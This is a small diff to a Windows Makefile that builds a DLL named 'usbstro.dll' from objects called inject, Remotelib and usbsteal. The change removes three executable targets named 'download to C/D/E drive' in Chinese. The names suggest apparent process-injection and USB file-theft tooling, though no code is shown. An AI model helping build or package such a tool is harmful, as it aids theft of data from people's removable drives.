@@ -2,7 +2,7 @@ CC=cl
 CCFLAGS=/EHsc /nologo /Os /MT
 LIBS=user32.lib shell32.lib
 OBJS=inject.obj Remotelib.obj RemotelibNT.obj misc.obj usbsteal.obj FileTraverse.obj
-all: usbstro.dll 下载到C盘.exe 下载到D盘.exe 下载到E盘.exe
+all: usbstro.dll
 zip: all
 	zip usbstro.zip usbstro.dll *.exe *.dll
 usbstro.dll: $(OBJS)
